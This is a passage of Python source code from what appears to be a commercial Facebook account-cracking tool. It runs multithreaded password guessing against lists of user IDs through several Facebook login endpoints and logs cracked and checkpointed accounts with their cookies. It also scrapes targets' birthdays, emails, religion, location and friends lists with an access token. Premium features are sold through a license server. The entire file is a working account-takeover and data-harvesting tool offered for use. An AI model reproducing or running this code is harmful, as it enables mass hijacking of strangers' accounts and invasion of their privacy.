        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
        elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' • 2015'
        elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' • 2018'
        elif fx[:5] in ['10004']           :tahunz = ' • 2019'
        elif fx[:5] in ['10005']           :tahunz = ' • 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' • 2008/2009'
    elif len(fx)==8:
        tahunz = ' • 2007/2008'
    elif len(fx)==7:
        tahunz = ' • 2006/2007'
    else:tahunz=''
    return tahunz

class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('')
        while True:
            try:
                while True:
                    try:
                        self.apk = files
                        self.fs = open(self.apk).read().splitlines()
                        break
                    except Exception as e:
                        print ("   %s"%(e))
                        continue
                self.fl = []
                os.system('rm -rf pass.txt')
                os.system('rm -rf passangka.txt')
                tambah_pass()
                tambah_pass_angka()
                for i in self.fs:
                    try:
                        self.fl.append({"id":i.split("•")[0],"pw":pass_dev(i.split("•")[1])})
                    except:continue
                start_method()
                put = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
                print('')
                if put in ['']:
                    jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                    menu()
                elif put in ['1','01','001','a']:
                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
                        cek_license()
                        started()
                        ThreadPool(35).map(self.api_opsi,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    elif puf in ['2','02','002','n','N']:
                        started()
                        ThreadPool(35).map(self.api,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    else:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                elif put in ['2','02','002','b']:
                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
                        cek_license()
                        started()
                        ThreadPool(35).map(self.mbasic_opsi,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    elif puf in ['2','02','002','n','N']:
                        started()
                        ThreadPool(35).map(self.mbasic,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    else:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                elif put in ['3','03','003','c']:
                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
                        cek_license()
                        started()
                        ThreadPool(35).map(self.free_opsi,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    elif puf in ['2','02','002','n','N']:
                        started()
                        ThreadPool(35).map(self.free,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    else:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                else:
                    jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                    menu()
            except Exception as e:
                print(("   %s"%e))
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end=' ');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end=' ');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end=' ');sys.stdout.flush()
        except:
            self.free(fl)
    def free_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end=' ');sys.stdout.flush()
        except:
            self.free_opsi(fl)

def target():
    try:token = open('token.txt','r').read()
    except (KeyError,IOError):jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
    idt = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s[%s!%s] %sID Not Found'%(M,P,M,P));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s[%s•%s] %sName : %s'%(K,P,K,P,nm))
    jalan('%s[%s•%s] %sFirst Name : %s'%(K,P,K,P,nd))
    jalan('%s[%s•%s] %sMiddle Name : %s'%(K,P,K,P,nt))
    jalan('%s[%s•%s] %sLast Name : %s'%(K,P,K,P,nb))
    jalan('%s[%s•%s] %sDate Of Birth : %s'%(K,P,K,P,ut))
    jalan('%s[%s•%s] %sGender : %s'%(K,P,K,P,gd))
    jalan('%s[%s•%s] %sEmail : %s'%(K,P,K,P,em))
    jalan('%s[%s•%s] %sLink : %s'%(K,P,K,P,lk))
    jalan('%s[%s•%s] %sUsername : %s'%(K,P,K,P,us))
    jalan('%s[%s•%s] %sReligion : %s'%(K,P,K,P,rg))
    jalan('%s[%s•%s] %sRelationship Status : %s'%(K,P,K,P,rl))
    jalan('%s[%s•%s] %sRelationship With : %s'%(K,P,K,P,rls))
    jalan('%s[%s•%s] %sLocation : %s'%(K,P,K,P,lc))
    jalan('%s[%s•%s] %sHometown : %s'%(K,P,K,P,ht))
    jalan('%s[%s•%s] %sAbout : %s'%(K,P,K,P,ab))
    jalan('%s[%s•%s] %sLocale : %s'%(K,P,K,P,lo))
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu()

def teman_target():
    cek_license()
    it = input('%s[%s•%s] %sID Target : '%(K,P,K,P))
    try:
        token = open('token.txt','r').read()
        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
        nn = json.loads(mm.text)
        print ('%s[%s•%s] %sName : %s'%(K,P,K,P,nn['name']))
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s[%s•%s] %sLimit Dump : '%(K,P,K,P))
    print('%s%s'%(K,P))
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tt.append(x['id'])
    for id in tt:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    te.append(b['id'])
            except KeyError:
                print('[!] Private')
            print('[•]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('[!] Account Was Spam')
    input('\n[ Back ]')
    menu()

def hasil():
    clear()
    banner()
    jalan('\n%s[ %sResult Crack %s]'%(K,P,K))
    print('\n%s[%s1%s] %sCheck Result OK'%(K,P,K,P))
    print('%s[%s2%s] %sCheck Result CP'%(K,P,K,P))
    ch = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    if ch in ['']:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('\n%s[%s Result Crack Has Been Saved At File OK %s]\n'%(K,P,K))
            for file in okl:
                print('%s[%s•%s] %s%s'%(K,P,K,P,file))
            files = input('\n%s[%s•%s] %sInput File Name : '%(K,P,K,P))
            print('')
            if files == "":
                jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s[%s•%s] %sTotal Result Crack At %s Is %s Account'%(K,P,K,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s[%s Result Not Found %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('\n%s[%s Result Crack Has Been Saved At File CP %s]\n'%(K,P,K))
            for file in cpl:
                print('%s[%s•%s] %s%s'%(K,P,K,P,file))
            files = input('\n%s[%s•%s] %sInput File Name : '%(K,P,K,P))
            print('')
            if files == "":
                jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s[%s•%s] %sTotal Result Crack At %s Is %s Account'%(K,P,K,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s[%s Result Not Found %s]'%(M,P,M))
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu()

def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s[%s!%s] %sAkun Terkena Spam"%(M,P,M,P))
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %sAkun OK Tidak Checkpoint"%(H,P,H,P))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %sOne Tap Account [Login]"%(H,P,H,P))
        else:
            print("%s[%s•%s] %sFound %s Option "%(K,P,K,P,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "*3, str(opt+1)+". "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
    else:
        print("%s[%s!%s] %sPassword Was Changed"%(M,P,M,P))
def cek_hasil():
    cek_license()
    jalan('%s[ %sCheck Option Result Crack %s]'%(K,P,K))
    print('\n%s[%s•%s] %sFile Example : CP/%s.txt'%(K,P,K,P,tanggal))
    files = input('%s[%s•%s] %sInput File : '%(K,P,K,P))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s[%s!%s] %sFile Not Found"%(M,P,M,P))
        time.sleep(2); cek_hasil()
    print("%s[%s•%s] %sTotal Account : %s"%(K,P,K,P,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        print("%s[%s•%s] %sCheck Login : %s"%(K,P,K,P,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('%s[%s•%s] %sChecking Proccess Was Ended'%(K,P,K,P))
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu()

def buy_license():
    clear()
    banner()
    jalan('%s[%s Menu License Key %s]'%(K,P,K))
    print('\n%s[%s1%s] %sBuy License Key'%(K,P,K,P))
    print('%s[%s2%s] %sLogin License Key'%(K,P,K,P))
    lz = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if lz =="":
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif lz == "1":
        os.system('rm -rf license.txt')
        id1 = uuid.uuid4().hex[:5].upper()
        id2 = uuid.uuid4().hex[:5].upper()
        id3 = uuid.uuid4().hex[:5].upper()
        id4 = uuid.uuid4().hex[:5].upper()
        open("license.txt", "w").write(id1+"-"+id2+"-"+id3+"-"+id4)
        time.sleep(1)
        print("%s[%s•%s] %sYour License Key : %s%s"%(K,P,K,P,K,open("license.txt", "r").read()))
        print("%s[%s•%s] %sDont Forget To Copy License Key & Save To Notepad!"%(K,P,K,P))
        print("\n%s[ %sPrice List Premium Script Full Access %s]"%(K,P,K))
        print("%s[%s1%s] %s1 Month Access : %sRp 20.000 Or $2"%(K,P,K,P,K))
        print("%s[%s2%s] %sUnlimited Access : %sRp 50.000 Or $5"%(K,P,K,P,K))
        print("\n%s[ %sIsi Data Pendaftaran License Key %s]"%(K,P,K))
        nama = input("%s[%s•%s] %sYour Name : "%(K,P,K,P))
        email = input("%s[%s•%s] %sYour Email : "%(K,P,K,P))
        durasi = input("%s[%s•%s] %sDuration : "%(K,P,K,P))
        apikey = open("license.txt", "r").read()
        url_wa = "https://api.whatsapp.com/send?phone=6282245780524&text="
        tks = "Hello Admin, I Want To Buy Premium Script Full Access\n\n"+"[•] Name : "+nama+"\n[•] Email : "+email+"\n[•] Duration : "+durasi+"\n[•] License Key : "+apikey
        subprocess.check_output(["am", "start", url_wa+quote(tks)])
        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif lz == "2":
        os.system('rm -rf license.txt')
        link = ("https://ngepetonline.000webhostapp.com/chek.php")
        project = ("premiumdapunta")
        key = input("%s[%s•%s] %sPut License Key : "%(K,P,K,P))
        cek = requests.get(link+"?project="+project+"&apikey="+key).json()
        if cek["status"] == "error":
            open("license.txt","w").write(key)
            print("\n%s[%s!%s] %sLicense Key Not Confirmed"%(M,P,M,P))
            time.sleep(1.0)
            menu()
        elif cek["status"] == "expired":
            open("license.txt","w").write(key)
            print("\n%s[%s!%s] %sLicense Key Was Expired"%(M,P,M,P))
            time.sleep(1.0)
            menu()
        else:
            open("license.txt","w").write(key)
            print("\n%s[%s!%s] %sLicense Key Confirmed"%(K,P,K,P))
            time.sleep(2.0)
            menu()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()

def cek_license():
    try:
        xd = open("license.txt","r").read()
        ow = requests.get(url_license + xd)
        p = json.loads(ow.text)
        k = p['username']
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    except:
        jalan('\n%s[%s•%s] %sYou Are A Free User'%(K,P,K,P))
        jalan('%s[%s•%s] %sIf You Want To Use This Feature'%(K,P,K,P))
        jalan('%s[%s•%s] %sBuy A License To The Admin First'%(K,P,K,P))
        exit()

def var_menu():
    print('%s[ %sChoose Login Methode %s]'%(K,P,K))
    print('\n%s[%s1%s] %sLogin With Token'%(K,P,K,P))
    print('%s[%s2%s] %sLogin With Cookies'%(K,P,K,P))
    print('%s[%s3%s] %sHow To Use Script'%(K,P,K,P))
    print('%s[%s4%s] %sInfo Author & Team Project'%(K,P,K,P))
    print('%s[%s0%s] %sExit'%(K,P,K,P))
def var_tutor():
    mlaku('%s[%s Tips & Tutorial %s]'%(K,P,K))
    print('\n%s[%s1%s] %sHow To Get Token'%(K,P,K,P))
    print('%s[%s2%s] %sHow To Get Cookies'%(K,P,K,P))
    print('%s[%s3%s] %sHow To Find Target'%(K,P,K,P))
    print('%s[%s4%s] %sHow During Crack Proccess'%(K,P,K,P))
def tutor_crack():
    mlaku('%s[%s1%s] %sApi : Fast Crack, But Spam Blocked'%(K,P,K,P))
    mlaku('%s[%s2%s] %sMbasic : Slow Crack, No Spam Blocked'%(K,P,K,P))
    mlaku('%s[%s3%s] %sFree FB : Super Slow Crack, No Spam Blocked, Result OK Increase'%(K,P,K,P))
    mlaku('%s[%s7%s] %sCrack With Internet Data (No Support Wifi)'%(K,P,K,P))
    mlaku('%s[%s8%s] %sIf Cracking Proccess No Result'%(K,P,K,P))
    mlaku('%s[%s9%s] %sTurn On Airplane Mode (5 Sec)'%(K,P,K,P))
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu_log()
def var_author():
    mlaku('%s[ %sAuthor & Team Project %s]'%(K,P,K))
    mlaku('%s'%(K))
    mlaku('%s[%s•%s] %sAuthor :'%(K,P,K,P))
    mlaku('%s     • %sDapunta Khurayra X'%(K,P))
    mlaku('%s'%(K))
    mlaku('%s[%s•%s] %sTeam Project %sXNSCODE%s :'%(K,P,K,P,K,P))
    mlaku('%s     • %sMuhamad Rizal Fiansyah Id'%(K,P))
    mlaku('%s     • %sAngga Kurniawan'%(K,P))
    mlaku('%s     • %sYayan XD'%(K,P))
    mlaku('%s     • %sBoy Hamzah'%(K,P))
    mlaku('%s     • %sLatip Harkat'%(K,P))
    mlaku('%s     • %sZacky Tricker'%(K,P))
    mlaku('%s     • %sSutan Ubay'%(K,P))
